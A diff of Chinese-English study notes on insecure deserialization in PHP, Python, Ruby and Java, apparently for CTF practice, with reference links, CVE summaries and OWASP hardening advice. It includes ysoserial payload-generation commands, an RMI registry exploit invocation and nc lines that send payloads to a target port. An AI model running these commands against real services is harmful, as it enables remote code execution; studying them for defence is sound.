@@ -2,6 +2,52 @@
 Magic methods @ python
 http://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html
 
+Deserialization of untrusted data - OWASP
+https://www.owasp.org/index.php/Deserialization_of_untrusted_data
+
+Deserialization Cheat Sheet - OWASP
+https://www.owasp.org/index.php/Deserialization_Cheat_Sheet
+
+
+Serialization and Deserialization what and why
+
+Serialization and Deserialization: working principle
+
+insecure Serialization and Deserialization:
+
+Harden
+
+attack and defense
+
+
+======================================================
+
+PHPSerialization and Deserialization
+http://www.phpinternalsbook.com/classes_objects/serialization.html
+
+
+物件生命週期lifecycle
+Understanding PHP objects - SlideShare
+https://www.slideshare.net/jpauli/understanding-php-objects
+
+Life Cycle of an Object in PHP and Object Caching
+Object-Oriented Programming with PHP5
+By Hasin Hayder
+December 2007
+Learn to leverage PHP5's OOP features to write manageable applications with ease
+
+PHP7 開發之道
+https://imyoungyang.gitbooks.io/php7-study-group-notes/content/Chapter2/php-magic-methods.html
+
+PHP 目前有15個 magic methods，依照功能大致分類如下：
+Categories	Magic Methods
+Stringification (物件字串輸出輸入)	__toString, __set_state, __debugInfo
+Lifecycle (物件生命週期)	__construct, __destruct
+Property Overloading (屬性覆寫)	__set, __get, __isset, __unset
+Method Overloading (方法覆寫)	__call, __callStatic
+Serialization (序列化)	__sleep, __wakeup
+Cloning (複製)	__clone
+Object Invocation (物件呼叫)	__invoke
 
 -------------------------------------
 <?php
@@ -20,6 +66,35 @@ $kb = unserialize($input);
 
 highlight_file(__FILE__);
 
+------------------------------------
+物件導向PHP
+http://php.net/manual/en/language.oop5.magic.php
+
+Magic Methods 
+The function names __construct(), __destruct(), __call(), __callStatic(), __get(), __set(), __isset(),
+__unset(), __sleep(), __wakeup(), __toString(), __invoke(), __set_state(), __clone() and __debugInfo() 
+are magical in PHP classes. 
+You cannot have functions with these names in any of your classes unless you want the magic functionality associated with them.
+
+PHP highlight_file() 函数:http://www.w3school.com.cn/php/func_misc_highlight_file.asp
+PHP highlight_file() Function - W3Schools
+https://www.w3schools.com/php/func_misc_highlight_file.asp
+
+9個Magic constants: __LINE__ 
+http://php.net/manual/zh/language.constants.predefined.php
+
+========================================================================
+Python Serialization and Deserialization
+http://spootnik.org/entries/2014/04/05/diving-into-the-python-pickle-formatt/index.html
+
+
+OWASP AppSecCali 2015 - Marshalling Pickles
+https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles
+P:83有測試網址
+
+
+python -m pickletools <file.pickle>
+
 -------------------------------------
 WheRe iS yOur gg?
 <?php
@@ -36,13 +111,72 @@ highlight_file(__FILE__);
 
 preg_match:限制你的
 
-ip:port/pickle.py
+解題步驟::
+[1]先看看原始碼ip:port/pickle.py
+
+[2]測看看是否有漏洞??
+
 ip:port
+
+[3]建造payload進行攻擊
 
 hackbar 
 post->送payload
+要url encode
 
 -------------------------------------
+Ruby Serialization and Deserialization
+
+https://docs.ruby-lang.org/en/2.4.0/Marshal.html
+
+Ruby Marshalling from A to Z
+https://ilyabylich.svbtle.com/ruby-marshalling-from-a-to-z
+
+Marshalling is a serialization process when you convert an object to a binary string.
+Ruby has a standard class Marshal that does all the job for serialization and deserialization.
+To serialize an object, use Marshal.dump, 
+to deserialize - Marshal.load or Marshal.restore.
+
+marshalled = Marshal.dump([1, 2, 'string', Object.new])
+# => "\x04\b[\ti\x06i\aI\"\vstring\x06:\x06ETo:\vObject\x00"
+
+Marshal.load(marshalled)
+# => [1, 2, "string", #<Object:0x00000002643000>]
+
+
+RubyGems.org | Ruby 社群Gem 套件管理平台
+RubyGems is a package management framework for Ruby.
+
+https://rubygems.org/?locale=zh-TW
+RubyGems.org 是Ruby 社群的Gem 套件管理服務，讓你能立即地發佈及安裝你的Gem 套件，並且利用API 查詢及操作可用Gem 的詳細資訊。
+
+分發Ruby程序和函式庫的標準格式「gem」
+https://github.com/rubygems/rubygems
+似於Python的pip（英語：Pip (package manager)
+RubyGems大約創建於2003年11月，從Ruby 1.9版起成為Ruby標準庫的一部分
+
+http://guides.rubygems.org/rubygems-basics/
+
+安裝devise套件：gem install devise
+安裝devise套件還指定要裝哪個版本的套件:gem install devise -v='1.1.8'
+套件砍掉：gem uninstall devise
+
+
+CVE-2017-0903
+Unsafe Object Deserialization Vulnerability in RubyGems
+https://blog.rubygems.org/2017/10/09/unsafe-object-deserialization-vulnerability.html
+
+
+YAML, like Marshal, is meant to serialize and deserialize arbitrary Ruby objects. 
+When RubyGems.org processes a Gem upload, it reads the Gem specification, which in turn reads the checksums in the Gem. 
+A clever attacker could write a checksum file to a Gem that contains YAML formatted in such a way 
+as to inject an arbitrary Ruby object and use that object as an escalation point.
+
+
+ CVE-2018-1000074 rubygems: Unsafe Object Deserialization Vulnerability in gem 
+ owner allowing arbitrary code execution on specially crafted YAML
+--------------------------------------------------------
+
 #!/usr/bin/ruby
 class Kaibro
     def initialize name
@@ -65,10 +199,101 @@ puts `#{t.name}`
 
 cat payload - | nc IP port
 
+-------------------------------------
+ Java deserialization vulnerability
 
 
+[1]Java-Deserialization-Cheat-Sheet
+https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
 
+
+[2]Java Deserialization Attacks: Angriff &	Verteidigung
+https://www.owasp.org/images/7/71/GOD16-Deserialization.pdf
+
+Tools:
+• Use	commercial	or	free	scanners	like	ZAP/Burp	
+–with	plugins	such	as	SuperSerial	to	passively	scan	for	Java	serializaPon	
+• Also	think	of	mass	scanning	of	server	endpoints	with	scripts	like	
+SerializeKiller		
+• Use WireShark	for	network	traffic	
+• If	allowed	to	instrument	the	app	use	runPme	agents	such	as	SWAT	to	find	
+out	if	anything	gets	deserialized
+
+[3]軍火庫 vs  漏洞掃描
+ysoserial
+A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
+https://github.com/frohoff/ysoserial
+
+unsafe deserialization of objects
 
 JAVA
 
+java -jar ysoserial.jar
 
+
+java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
+
+$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
+$ nc 10.10.10.10 1099 < groovypayload.bin
+
+$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
+
+
+https://blog.netspi.com/java-deserialization-attacks-burp/
+[1]產生Payload
+java -jar ./ysoserial-0.0.4-all.jar CommonsCollections1 ‘ping netspi.com’ > payload
+[2]載入到Burp進行攻擊
+copy the serialized output into Burp using the paste from file context menu item
+
+ Burp extension Java Serial Killer to perform the serialization for me. 
+ It essentially is a modified Repeater tab that uses the payload generation from ysoserial.
+ 
+ https://github.com/NetSPI/JavaSerialKiller
+
+Java-Deserialization-Cheat-Sheet: info on vulnerabilities, tools, blogs/write-ups, etc.
+marshalsec: similar project for various Java deserialization formats/libraries
+ysoserial.net: similar project for .NET deserialization
+
+[4][防禦手法]Wayout:?
+DO	NOT	DESERIALIZE	UNTRUSTED	DATA!!	
+When	architecture	permits	it:		
+– Use	other	formats	instead	of	serialized	objects:	JSON,	XML,	etc.		
+• But	be	aware	of	XML-based	deserialization	attacks	via	XStream,	XmlDecoder,	etc.	
+
+As	second-best	option:	
+Use	defensive	deserialization	with	look-ahead	OIS	with	a strict	whitelist		
+• Don’t	rely	on	gadget-blacklisting	alone!
+• You	can	build	the	whitelist	with	OpenSource	agent	SWAT
+(	Serial	Whitelist	Application	Trainer:	https://github.com/cschneider4711/SWAT	)	
+• Consider	an	agent-based	instrumenting	of	ObjectInputStream	(to	catch	them	all)	
+• Scan	your	own	whitelisted	code	for	potential	gadgets
+• Still	be	aware	of	DoS	scenarios
+
+
+java.io.ObjectInputStream class is used to deserialize objects. 
+It's possible to harden its behavior by subclassing it. 
+However, if you don't own the code or can't wait for a patch, 
+using an agent to weave in hardening to java.io.ObjectInputStream is the best solution.
+
+To enable these agents, simply add a new JVM parameter:
+
+-javaagent:name-of-agent.jar
+
+
+[5][防禦與再攻擊]Attack and defense? bypassing the security 
+
+
+Exploiting Java Deserialization Vulnerabilities (RCE) on JSF/Seam ...
+https://www.youtube.com/watch?v=VaLSYzEWgVE
+
+
+https://www.synopsys.com/content/dam/synopsys/sig-assets/whitepapers/exploiting-the-java-deserialization-vulnerability.pdf
+
+java - Malicious object injection with xstream - Stack Overflow
+
+A Deserialization Attack relies on feeding serialized, malicious data (Shellcode, commands, database records, etc.) 
+into a listening service which deserializes the data it receives. 
+If the attack is successful, the sent malicious code could cause a Denial of Service, a Bypassed Authentication Control 
+or even Remote Code Execution. 
+Because (de)serialization is such a broadly used technology, there are countless vulnerabilities, covering all Operating Systems, 
+many Applications and many Programming Languages such as C, C++, Python, and Ruby.
